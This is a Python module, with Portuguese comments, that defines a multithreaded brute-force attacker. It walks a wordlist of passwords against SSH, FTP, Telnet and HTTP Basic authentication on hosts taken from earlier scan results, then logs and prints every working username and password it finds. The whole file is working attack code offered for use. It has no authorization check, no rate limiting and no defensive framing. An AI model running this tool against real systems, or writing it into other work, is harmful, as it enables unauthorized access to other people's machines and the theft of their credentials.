#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time
import socket
import logging
import threading
import queue
import requests
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from colorama import Fore, Style

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

class BruteForceAttacker:
    """Classe para realizar ataques de força bruta em serviços descobertos.
    
    Attributes:
        scan_results (dict): Resultados do escaneamento {host: {port: service}}
        users (list): Lista de usuários para tentar
        wordlist_path (str): Caminho para a wordlist de senhas
        timeout (int): Timeout para conexões em segundos
        logger (logging.Logger): Logger para registro de eventos
    """
    
    def __init__(self, scan_results, users, wordlist_path, timeout=5, logger=None):
        """Inicializa o atacante de força bruta.
        
        Args:
            scan_results (dict): Resultados do escaneamento {host: {port: service}}
            users (list): Lista de usuários para tentar
            wordlist_path (str): Caminho para a wordlist de senhas
            timeout (int, optional): Timeout em segundos. Default é 5
            logger (logging.Logger, optional): Logger para registro
        """
        self.scan_results = scan_results
        self.users = users
        self.wordlist_path = wordlist_path
        self.timeout = timeout
        self.logger = logger or logging.getLogger('wifi_scanner')
        
        # Mapeamento de serviços para métodos de brute force
        self.service_map = {
            'ssh': self._brute_force_ssh,
            'ftp': self._brute_force_ftp,
            'telnet': self._brute_force_telnet,
            'http': self._brute_force_http_basic,
            'https': self._brute_force_http_basic
        }
        
        # Inicializar threadpool para paralelismo
        self.executor = ThreadPoolExecutor(max_workers=10)
        
        # Fila para armazenar resultados
        self.result_queue = queue.Queue()
        
        # Contador de tentativas
        self.attempt_count = 0
        self.success_count = 0
        
        # Flag para interrupção
        self.stop_flag = threading.Event()
    
    def _load_passwords(self):
        """Carrega senhas da wordlist.
        
        Returns:
            list: Lista de senhas da wordlist
        """
        try:
            with open(self.wordlist_path, 'r', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.logger.error(f"Erro ao carregar wordlist: {str(e)}")
            return []
    
    def _brute_force_ssh(self, host, port, user, password):
        """Tenta login SSH usando as credenciais fornecidas.
        
        Args:
            host (str): Endereço IP do host
            port (int): Porta SSH
            user (str): Nome de usuário para tentar
            password (str): Senha para tentar
            
        Returns:
            bool: True se o login for bem-sucedido, False caso contrário
        """
        if not PARAMIKO_AVAILABLE:
            self.logger.warning("Módulo paramiko não está disponível para brute force SSH")
            return False
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(
                hostname=host,
                port=port,
                username=user,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            
            # Login bem-sucedido
            self.logger.info(f"Credenciais encontradas - {host}:{port} (ssh) - {user}:{password}")
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            # Falha na autenticação
            return False
        except (paramiko.SSHException, socket.error) as e:
            # Erro de conexão
            self.logger.debug(f"Erro ao tentar SSH em {host}:{port} - {str(e)}")
            return False
        except Exception as e:
            # Outros erros
            self.logger.debug(f"Erro inesperado ao tentar SSH em {host}:{port} - {str(e)}")
            return False
        finally:
            client.close()
    
    def _brute_force_ftp(self, host, port, user, password):
        """Tenta login FTP usando as credenciais fornecidas.
        
        Args:
            host (str): Endereço IP do host
            port (int): Porta FTP
            user (str): Nome de usuário para tentar
            password (str): Senha para tentar
            
        Returns:
            bool: True se o login for bem-sucedido, False caso contrário
        """
        try:
            import ftplib
            
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=self.timeout)
            
            try:
                ftp.login(user, password)
                
                # Login bem-sucedido
                self.logger.info(f"Credenciais encontradas - {host}:{port} (ftp) - {user}:{password}")
                ftp.quit()
                return True
                
            except ftplib.error_perm:
                # Falha na autenticação
                return False
            
        except Exception as e:
            # Erro de conexão ou outros
            self.logger.debug(f"Erro ao tentar FTP em {host}:{port} - {str(e)}")
            return False
    
    def _brute_force_telnet(self, host, port, user, password):
        """Tenta login Telnet usando as credenciais fornecidas.
        
        Args:
            host (str): Endereço IP do host
            port (int): Porta Telnet
            user (str): Nome de usuário para tentar
            password (str): Senha para tentar
            
        Returns:
            bool: True se o login for bem-sucedido, False caso contrário
        """
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(host, port, timeout=self.timeout)
            
            # Espera pelo prompt de login
            tn.read_until(b"login: ", timeout=self.timeout)
            tn.write(user.encode('ascii') + b"\n")
            
            # Espera pelo prompt de senha
            tn.read_until(b"Password: ", timeout=self.timeout)
            tn.write(password.encode('ascii') + b"\n")
            
            # Lê a resposta
            response = tn.read_some()
            
            # Verifica se o login foi bem-sucedido
            if b"Login incorrect" not in response and b"incorrect password" not in response:
                self.logger.info(f"Credenciais encontradas - {host}:{port} (telnet) - {user}:{password}")
                tn.close()
                return True
            
            tn.close()
            return False
            
        except Exception as e:
            # Erro de conexão ou outros
            self.logger.debug(f"Erro ao tentar Telnet em {host}:{port} - {str(e)}")
            return False
    
    def _brute_force_http_basic(self, host, port, user, password):
        """Tenta autenticação HTTP Basic usando as credenciais fornecidas.
        
        Args:
            host (str): Endereço IP do host
            port (int): Porta HTTP/HTTPS
            user (str): Nome de usuário para tentar
            password (str): Senha para tentar
            
        Returns:
            bool: True se a autenticação for bem-sucedida, False caso contrário
        """
        try:
            # Determinar o protocolo com base na porta ou serviço
            protocol = "https" if port == 443 else "http"
            
            url = f"{protocol}://{host}:{port}/"
            
            # Tentar autenticação básica
            response = requests.get(
                url,
                auth=HTTPBasicAuth(user, password),
                timeout=self.timeout,
                verify=False  # Desativar verificação de certificados para HTTPS
            )
            
            # Verificar resposta
            if response.status_code == 200:
                self.logger.info(f"Credenciais encontradas - {host}:{port} ({protocol}) - {user}:{password}")
                return True
            
            if response.status_code == 401:
                # Autenticação falhou
                return False
            
            # Verificar se a página requer autenticação
            if 'www-authenticate' not in response.headers:
                self.logger.debug(f"{host}:{port} não requer autenticação básica HTTP")
                return False
            
            return False
            
        except requests.exceptions.RequestException as e:
            # Erro de conexão ou outros
            self.logger.debug(f"Erro ao tentar HTTP em {host}:{port} - {str(e)}")
            return False
        except Exception as e:
            # Outros erros
            self.logger.debug(f"Erro inesperado ao tentar HTTP em {host}:{port} - {str(e)}")
            return False
    
    def _brute_force_service(self, host, port, service):
        """Realiza brute force em um serviço específico.
        
        Args:
            host (str): Endereço IP do host
            port (int): Número da porta
            service (str): Nome do serviço
            
        Returns:
            list: Lista de credenciais encontradas [(user, password), ...]
        """
        # Verificar se existe um método para o serviço
        if service not in self.service_map:
            self.logger.debug(f"Não há suporte para brute force no serviço {service}")
            return []
        
        # Método de brute force para o serviço
        brute_force_method = self.service_map[service]
        
        # Carregar senhas
        passwords = self._load_passwords()
        self.logger.debug(f"Carregadas {len(passwords)} senhas para teste")
        
        # Inicializar lista de credenciais
        credentials = []
        
        # Configurar barra de progresso para este serviço
        total_attempts = len(self.users) * len(passwords)
        
        # Iniciar tentativas
        self.logger.debug(f"Iniciando brute force em {host}:{port} ({service})")
        
        for user in self.users:
            # Verificar se deve parar
            if self.stop_flag.is_set():
                break
                
            for password in passwords:
                # Verificar se deve parar
                if self.stop_flag.is_set():
                    break
                
                # Incrementar contador
                self.attempt_count += 1
                
                # Tentar autenticação
                if brute_force_method(host, port, user, password):
                    credentials.append((user, password))
                    self.success_count += 1
                    
                    # Adicionar à fila de resultados
                    self.result_queue.put((host, port, service, user, password))
        
        return credentials
    
    def attack(self):
        """Inicia o ataque de brute force em todos os serviços descobertos.
        
        Returns:
            dict: Credenciais encontradas {host: {service: [(user, password), ...]}}
        """
        # Resultados
        results = {}
        
        # Contar serviços para atacar
        services_count = 0
        for host, ports in self.scan_results.items():
            for port, service in ports.items():
                if service in self.service_map:
                    services_count += 1
        
        if services_count == 0:
            self.logger.info("Nenhum serviço vulnerável a brute force encontrado")
            return results
        
        self.logger.info(f"Iniciando brute force em {services_count} serviços...")
        
        # Lista de futuros para os resultados assíncronos
        futures = []
        
        # Iniciar tarefas de brute force
        for host, ports in self.scan_results.items():
            for port, service in ports.items():
                if service in self.service_map:
                    future = self.executor.submit(self._brute_force_service, host, port, service)
                    futures.append((host, port, service, future))
        
        # Configurar a barra de progresso
        with tqdm(total=services_count, desc="Progresso de Brute Force", unit="serviço") as pbar:
            completed = 0
            
            # Processar resultados à medida que ficam disponíveis
            while completed < len(futures):
                for i, (host, port, service, future) in enumerate(futures):
                    if future.done() and (host, port, service, future) in futures:
                        completed += 1
                        pbar.update(1)
                        
                        # Obter resultado
                        credentials = future.result()
                        
                        # Salvar credenciais encontradas
                        if credentials:
                            if host not in results:
                                results[host] = {}
                            
                            if service not in results[host]:
                                results[host][service] = []
                            
                            results[host][service].extend(credentials)
                        
                        # Remover da lista para não processar novamente
                        futures[i] = (None, None, None, None)
                
                # Pequena pausa para não consumir CPU
                time.sleep(0.1)
        
        self.logger.info(f"Brute force concluído. {self.attempt_count} tentativas, {self.success_count} sucessos.")
        
        # Exibir resultados no terminal
        if results:
            print(f"\n{Fore.GREEN}[+] Credenciais encontradas:{Style.RESET_ALL}")
            for host, services in results.items():
                for service, creds in services.items():
                    for user, password in creds:
                        print(f"{Fore.CYAN}[*] {host} ({service}):{Style.RESET_ALL} {Fore.YELLOW}{user}:{password}{Style.RESET_ALL}")
        
        return results